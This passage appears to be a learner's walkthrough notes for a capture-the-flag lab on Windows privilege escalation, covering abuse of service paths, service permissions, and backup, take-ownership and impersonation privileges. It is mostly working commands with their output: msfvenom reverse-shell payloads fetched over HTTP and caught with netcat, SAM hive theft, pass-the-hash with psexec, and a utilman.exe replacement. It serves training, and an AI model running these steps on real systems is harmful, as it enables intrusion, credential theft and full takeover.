user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe

user@attackerpc$ nc -lvp 4446
```

Once the payload is in the server, move it to any of the locations where hijacking might occur. In this case, we will be moving our payload to `C:\MyPrograms\Disk.exe`. We will also grant Everyone full permissions on the file to make sure it can be executed by the service:

```

Command Prompt

C:\> move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe

C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
        Successfully processed 1 files.

```

Once the service gets restarted, your payload should execute:

```Command Prompt

C:\> sc stop "disk sorter enterprise"
C:\> sc start "disk sorter enterprise"
```

As a result, you'll get a reverse shell with svcusr2 privileges:

```

Kali Linux

user@attackerpc$ nc -lvp 4446
Listening on 0.0.0.0 4446
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr2

```

Go to svcusr2 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.


Insecure Service Permissions

You might still have a slight chance of taking advantage of a service if the service's executable DACL is well configured, and the service's binary path is rightly quoted. Should the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.

To check for a service DACL from the command line, you can use [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite. For your convenience, a copy is available at `C:\\tools`. The command to check for the thmservice service DACL is:

```
C:\tools\AccessChk> accesschk64.exe -qlc thmservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
```

Here we can see that the `BUILTIN\\Users` group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service.

Before changing the service, let's build another exe-service reverse shell and start a listener for it on the attacker's machine:

```

Kali Linux

user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe

user@attackerpc$ nc -lvp 4447

```

We will then transfer the reverse shell executable to the target machine and store it in `C:\Users\thm-unpriv\rev-svc3.exe`. Feel free to use wget to transfer your executable and move it to the desired location. Remember to grant permissions to Everyone to execute your payload:

```
C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```

To change the service's associated executable and account, we can use the following command (mind the spaces after the equal signs when using sc.exe):

```
C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

Notice we can use any account to run the service. We chose LocalSystem as it is the highest privileged account available. To trigger our payload, all that rests is restarting the service:

```
C:\> sc stop THMService
C:\> sc start THMService
```

And we will receive a shell back in our attacker's machine with SYSTEM privileges:

```
user@attackerpc$ nc -lvp 4447
Listening on 0.0.0.0 4447
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
NT AUTHORITY\SYSTEM


```

Go to the Administrator's desktop to retrieve a flag. Don't forget to input the flag at the end of this task.

```
C:\Users\thm-unpriv>sc qc apphostsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Application Host Helper Service
        DEPENDENCIES       :
        SERVICE_START_NAME : localSystem

C:\Users\thm-unpriv>sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: WindowsScheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr1

C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files

C:\Users\thm-unpriv>ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\thm-unpriv>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\thm-unpriv

09/01/2022  05:10 PM    <DIR>          .
09/01/2022  05:10 PM    <DIR>          ..
05/03/2022  03:14 PM    <DIR>          3D Objects
05/03/2022  03:14 PM    <DIR>          Contacts
05/04/2022  08:15 AM    <DIR>          Desktop
05/03/2022  03:14 PM    <DIR>          Documents
05/03/2022  03:14 PM    <DIR>          Downloads
05/03/2022  03:14 PM    <DIR>          Favorites
05/03/2022  03:14 PM    <DIR>          Links
05/03/2022  03:14 PM    <DIR>          Music
05/03/2022  03:14 PM    <DIR>          Pictures
09/01/2022  05:10 PM            48,640 rev-svc.exe
05/03/2022  03:14 PM    <DIR>          Saved Games
05/03/2022  03:14 PM    <DIR>          Searches
05/03/2022  03:14 PM    <DIR>          Videos
               1 File(s)         48,640 bytes
              14 Dir(s)  15,004,889,088 bytes free


kali
┌──(kali㉿kali)-[~/Downloads/Windows_priv]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.81.220 LPORT=4445 -f exe-service -o rev-svc.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 48640 bytes
Saved as: rev-svc.exe
                                                                          
┌──(kali㉿kali)-[~/Downloads/Windows_priv]
└─$ python3 -m http.server                  
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.90.7 - - [01/Sep/2022 13:10:30] "GET /rev-svc.exe HTTP/1.1" 200 -

powershell 

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\thm-unpriv> wget http://10.11.81.220:8000/rev-svc.exe -O rev-svc.exe

C:\Users\thm-unpriv>cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\PROGRA~2\SYSTEM~1

05/03/2022  11:56 AM    <DIR>          .
05/03/2022  11:56 AM    <DIR>          ..
05/17/2007  01:47 PM             1,150 alarmclock.ico
08/31/2003  12:06 PM               766 clock.ico
08/31/2003  12:06 PM            80,856 ding.wav
09/01/2022  05:07 PM    <DIR>          Events
05/03/2022  11:56 AM                60 Forum.url
01/08/2009  08:21 PM         1,637,972 libeay32.dll
11/16/2004  12:16 AM             9,813 License.txt
09/01/2022  02:35 PM               696 LogFile.txt
09/01/2022  02:40 PM             1,343 LogfileAdvanced.txt
03/25/2018  10:58 AM           536,992 Message.exe
03/25/2018  10:59 AM           445,344 PlaySound.exe
03/25/2018  10:58 AM            27,040 PlayWAV.exe
05/03/2022  12:04 PM               108 Preferences.ini
03/25/2018  10:58 AM           485,792 Privilege.exe
03/24/2018  12:09 PM            10,100 ReadMe.txt
03/25/2018  10:58 AM           112,544 RunNow.exe
03/25/2018  10:59 AM            40,352 sc32.exe
08/31/2003  12:06 PM               766 schedule.ico
03/25/2018  10:58 AM         1,633,696 Scheduler.exe
03/25/2018  10:59 AM           491,936 SendKeysHelper.exe
03/25/2018  10:58 AM           437,664 ShowXY.exe
03/25/2018  10:58 AM           439,712 ShutdownGUI.exe
03/25/2018  10:58 AM           235,936 SSAdmin.exe
03/25/2018  10:58 AM           731,552 SSCmd.exe
01/08/2009  08:12 PM           355,446 ssleay32.dll
03/25/2018  10:58 AM           456,608 SSMail.exe
05/03/2022  11:56 AM             6,867 unins000.dat
05/03/2022  11:56 AM           722,597 unins000.exe
05/03/2022  11:56 AM                54 Website.url
06/26/2009  05:27 PM             6,574 whiteclock.ico
03/25/2018  10:58 AM            76,704 WhoAmI.exe
05/16/2006  04:49 PM           785,042 WSCHEDULER.CHM
05/16/2006  03:58 PM             2,026 WScheduler.cnt
03/25/2018  10:58 AM           331,168 WScheduler.exe
05/16/2006  04:58 PM           703,081 WSCHEDULER.HLP
03/25/2018  10:58 AM           136,096 WSCtrl.exe
03/25/2018  10:58 AM            98,720 WService.exe
03/25/2018  10:58 AM            68,512 WSLogon.exe
03/25/2018  10:59 AM            33,184 WSProc.dll
              38 File(s)     11,144,869 bytes
               3 Dir(s)  15,004,889,088 bytes free

C:\PROGRA~2\SYSTEM~1>move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1>move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1>icacls WService.exe /grant Everyone:F
processed file: WService.exe
Successfully processed 1 files; Failed processing 0 files

netcat kali machine

┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4445  

stop/start service
C:\PROGRA~2\SYSTEM~1>sc stop windowsscheduler

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x3e8

C:\PROGRA~2\SYSTEM~1>sc start windowsscheduler

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4352
        FLAGS              :

rev_shell

──(kali㉿kali)-[~]
└─$ nc -nlvp 4445          
listening on [any] 4445 ...
connect to [10.11.81.220] from (UNKNOWN) [10.10.90.7] 49915
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
wprivesc1\svcusr1

C:\Windows\system32>cd ..
cd ..

C:\Windows>cd ..
cd ..

C:\>cd Users
cd Users

C:\Users>cd svcusr1
cd svcusr1

C:\Users\svcusr1>cd Desktop
cd Desktop

C:\Users\svcusr1\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\svcusr1\Desktop

05/03/2022  01:00 PM    <DIR>          .
05/03/2022  01:00 PM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
05/03/2022  01:01 PM                20 flag.txt
               3 File(s)          1,101 bytes
               2 Dir(s)  15,004,762,112 bytes free

C:\Users\svcusr1\Desktop>more flag.txt
more flag.txt
THM{AT_YOUR_SERVICE}

```

Get the flag on svcusr1's desktop.
*THM{AT_YOUR_SERVICE}*


```
C:\Users\thm-unpriv>sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2

C:\Users\thm-unpriv>icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files


┌──(kali㉿kali)-[~/Downloads/Windows_priv]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.81.220 LPORT=4446 -f exe-service -o rev-svc2.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 48640 bytes
Saved as: rev-svc2.exe
                                                                          
┌──(kali㉿kali)-[~/Downloads/Windows_priv]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.90.7 - - [01/Sep/2022 13:24:54] "GET /rev-svc2.exe HTTP/1.1" 200 -


PS C:\Users\thm-unpriv> wget http://10.11.81.220:8000/rev-svc2.exe -O rev-svc2.exe

C:\Users\thm-unpriv>dir                                                                                                    Volume in drive C has no label.                                                                                           Volume Serial Number is A8A4-C362                                                                                                                                                                                                                   Directory of C:\Users\thm-unpriv                                                                                                                                                                                                                   09/01/2022  05:24 PM    <DIR>          .                                                                                  09/01/2022  05:24 PM    <DIR>          ..                                                                                 05/03/2022  03:14 PM    <DIR>          3D Objects                                                                         05/03/2022  03:14 PM    <DIR>          Contacts                                                                           05/04/2022  08:15 AM    <DIR>          Desktop                                                                            05/03/2022  03:14 PM    <DIR>          Documents                                                                          05/03/2022  03:14 PM    <DIR>          Downloads                                                                          05/03/2022  03:14 PM    <DIR>          Favorites                                                                          05/03/2022  03:14 PM    <DIR>          Links                                                                              05/03/2022  03:14 PM    <DIR>          Music                                                                              05/03/2022  03:14 PM    <DIR>          Pictures                                                                           09/01/2022  05:24 PM            48,640 rev-svc2.exe                                                                       05/03/2022  03:14 PM    <DIR>          Saved Games                                                                        05/03/2022  03:14 PM    <DIR>          Searches                                                                           05/03/2022  03:14 PM    <DIR>          Videos                                                                                            1 File(s)         48,640 bytes                                                                                           14 Dir(s)  15,003,557,888 bytes free                                                                                                                                                                                                  C:\Users\thm-unpriv>move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe                                                  1 file(s) moved.                                                                                                                                                                                                                            C:\Users\thm-unpriv>icacls C:\MyPrograms\Disk.exe /grant Everyone:F                                                       processed file: C:\MyPrograms\Disk.exe                                                                                    Successfully processed 1 files; Failed processing 0 files    

┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4446

C:\Users\thm-unpriv>sc stop "disk sorter enterprise"

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Users\thm-unpriv>sc start "disk sorter enterprise"

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 4700
        FLAGS              :

C:\Users\thm-unpriv>cd C:\MyPrograms

C:\MyPrograms>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\MyPrograms

09/01/2022  05:25 PM    <DIR>          .
09/01/2022  05:25 PM    <DIR>          ..
05/03/2022  03:16 PM    <DIR>          Disk Sorter Enterprise
09/01/2022  05:24 PM            48,640 Disk.exe
05/03/2022  07:44 PM    <DIR>          THMService
               1 File(s)         48,640 bytes
               4 Dir(s)  15,002,382,336 bytes free


┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4446
listening on [any] 4446 ...
connect to [10.11.81.220] from (UNKNOWN) [10.10.90.7] 49918
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
wprivesc1\svcusr2

C:\Windows\system32>more C:\Users\svcusr2\Desktop\flag.txt
more C:\Users\svcusr2\Desktop\flag.txt
THM{QUOTES_EVERYWHERE}

```

Get the flag on svcusr2's desktop.

*THM{QUOTES_EVERYWHERE}*


```
C:\Users\thm-unpriv>cd C:\tools\AccessChk

C:\tools\AccessChk>accesschk64.exe -qlc thmservice

Accesschk v6.14 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2021 Mark Russinovich
Sysinternals - www.sysinternals.com (accept terms)

thmservice
  DESCRIPTOR FLAGS:
      [SE_DACL_PRESENT]
      [SE_SACL_PRESENT]
      [SE_SELF_RELATIVE]
  OWNER: NT AUTHORITY\SYSTEM
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [1] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  [2] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\INTERACTIVE
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [3] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SERVICE
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS

C:\tools\AccessChk>


┌──(kali㉿kali)-[~/Downloads/Windows_priv]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.81.220 LPORT=4447 -f exe-service -o rev-svc3.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 48640 bytes
Saved as: rev-svc3.exe
                                                                          
┌──(kali㉿kali)-[~/Downloads/Windows_priv]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.90.7 - - [01/Sep/2022 13:34:57] "GET /rev-svc3.exe HTTP/1.1" 200 -


PS C:\Users\thm-unpriv> wget http://10.11.81.220:8000/rev-svc3.exe -O rev-svc3.exe

C:\Users\thm-unpriv>icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
processed file: C:\Users\thm-unpriv\rev-svc3.exe
Successfully processed 1 files; Failed processing 0 files

C:\Users\thm-unpriv>sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
[SC] ChangeServiceConfig SUCCESS

┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4447

C:\Users\thm-unpriv>sc stop THMService
[SC] ControlService FAILED 1062:

The service has not been started.


C:\Users\thm-unpriv>sc start THMService

SERVICE_NAME: THMService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2616
        FLAGS              :

┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4447
listening on [any] 4447 ...
connect to [10.11.81.220] from (UNKNOWN) [10.10.90.7] 49926
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>more C:\Users\Administrator\Desktop\flag.txt         
more C:\Users\Administrator\Desktop\flag.txt
THM{INSECURE_SVC_CONFIG}

```

Get the flag on the Administrator's desktop.

*THM{INSECURE_SVC_CONFIG}*

### Abusing dangerous privileges 

Windows Privileges

Privileges are rights that an account has to perform specific system-related tasks. These tasks can be as simple as the privilege to shut down the machine up to privileges to bypass some DACL-based access controls.

Each user has a set of assigned privileges that can be checked with the following command:

`whoami /priv`

A complete list of available privileges on Windows systems is available [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants). From an attacker's standpoint, only those privileges that allow us to escalate in the system are of interest. You can find a comprehensive list of exploitable privileges on the [Priv2Admin](https://github.com/gtworek/Priv2Admin) Github project.

While we won't take a look at each of them, we will showcase how to abuse some of the most common privileges you can find.

SeBackup / SeRestore

The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.

Having this power, an attacker can trivially escalate privileges on the system by using many techniques. The one we will look at consists of copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash.

Log in to the target machine via RDP using the following credentials:

User: THMBackup

Password: CopyMaster555

This account is part of the "Backup Operators" group, which by default is granted the SeBackup and SeRestore privileges. We will need to open a command prompt using the "Open as administrator" option to use these privileges. We will be asked to input our password again to get an elevated console:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/befb434f15dbd4deee0654f8b6ef6de0.png)

Once on the command prompt, we can check our privileges with the following command:
Command Prompt

```
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

To backup the SAM and SYSTEM hashes, we can use the following commands:
Command Prompt

```
C:\> reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.

C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.
```
This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using SMB or any other available method. For SMB, we can use impacket's smbserver.py to start a simple SMB server with a network share in the current directory of our AttackBox:

```
Kali Linux

user@attackerpc$ mkdir share
user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
        
```

This will create a share named public pointing to the share directory, which requires the username and password of our current windows session. After this, we can use the copy command in our windows machine to transfer both files to our AttackBox: 

```
Command Prompt

C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\

        
```

And use impacket to retrieve the users' password hashes:

```
Kali Linux

user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

```

We can finally use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:

```
Kali Linux

user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.12.124
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.175.90.....
[*] Found writable share ADMIN$
[*] Uploading file nfhtabqO.exe
[*] Opening SVCManager on 10.10.175.90.....
[*] Creating service RoLE on 10.10.175.90.....
[*] Starting service RoLE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
        
```

SeTakeOwnership

The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as SYSTEM and take ownership of the service's executable. For this task, we will be taking a different route, however.

Log in to the target machine via RDP using the following credentials:

User: THMTakeOwnership

Password: TheWorldIsMine2022

To get the SeTakeOwnership privilege, we need to open a command prompt using the "Open as administrator" option. We will be asked to input our password to get an elevated console:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/33303d0cde736589d2838ee894379ff2.png)

Once on the command prompt, we can check our privileges with the following command:

```
Command Prompt

C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled

```

We'll abuse `utilman.exe` to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a5437a609e41d982b320967667e9b97a.png)


Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file, replacing it is trivial.

To replace utilman, we will start by taking ownership of it with the following command:

```
Command Prompt

C:\> takeown /f C:\Windows\System32\Utilman.exe

SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership".

```

Notice that being the owner of a file doesn't necessarily mean that you have privileges over it, but being the owner you can assign yourself any privileges you need. To give your user full permissions over utilman.exe you can use the following command:

```
Command Prompt

C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
processed file: Utilman.exe
Successfully processed 1 files; Failed processing 0 files
```

After this, we will replace utilman.exe with a copy of cmd.exe:

```
Command Prompt

C:\Windows\System32\> copy cmd.exe utilman.exe
        1 file(s) copied.
```

To trigger utilman, we will lock our screen from the start button:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/dd7290ca93369cee33182023cb9190ff.png)

And finally, proceed to click on the "Ease of Access" button, which runs utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1401bc3dcb1e4eb84f526b95567a5ef8.png)


SeImpersonate / SeAssignPrimaryToken

These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.

Impersonation is easily understood when you think about how an FTP server works. The FTP server must restrict users to only access the files they should be allowed to see.

Let's assume we have an FTP service running with user ftp. Without impersonation, if user Ann logs into the FTP server and tries to access her files, the FTP service would try to access them with its access token rather than Ann's:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/006115497113a0a4f03008028dc32fb7.png)

There are several reasons why using ftp's token is not the best idea: - For the files to be served correctly, they would need to be accessible to the ftp user. In the example above, the FTP service would be able to access Ann's files, but not Bill's files, as the DACL in Bill's files doesn't allow user ftp. This adds complexity as we must manually configure specific permissions for each served file/directory. - For the operating system, all files are accessed by user ftp, independent of which user is currently logged in to the FTP service. This makes it impossible to delegate the authorisation to the operating system; therefore, the FTP service must implement it. - If the FTP service were compromised at some point, the attacker would immediately gain access to all of the folders to which the ftp user has access.

If, on the other hand, the FTP service's user has the SeImpersonate or SeAssignPrimaryToken privilege, all of this is simplified a bit, as the FTP service can temporarily grab the access token of the user logging in and use it to perform any task on their behalf:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c25de66ae7777169d09a61ce2fb38e28.png)

Now, if user Ann logs in to the FTP service and given that the ftp user has impersonation privileges, it can borrow Ann's access token and use it to access her files. This way, the files don't need to provide access to user ftp in any way, and the operating system handles authorisation. Since the FTP service is impersonating Ann, it won't be able to access Jude's or Bill's files during that session.

As attackers, if we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.

In Windows systems, you will find that the LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have such privileges. Since these accounts are used to spawn services using restricted accounts, it makes sense to allow them to impersonate connecting users if the service needs. Internet Information Services (IIS) will also create a similar default account called "iis apppool\defaultapppool" for web applications.

To elevate privileges using such accounts, an attacker needs the following: 1. To spawn a process so that users can connect and authenticate to it for impersonation to occur. 2. Find a way to force privileged users to connect and authenticate to the spawned malicious process.

We will use RogueWinRM exploit to accomplish both conditions.

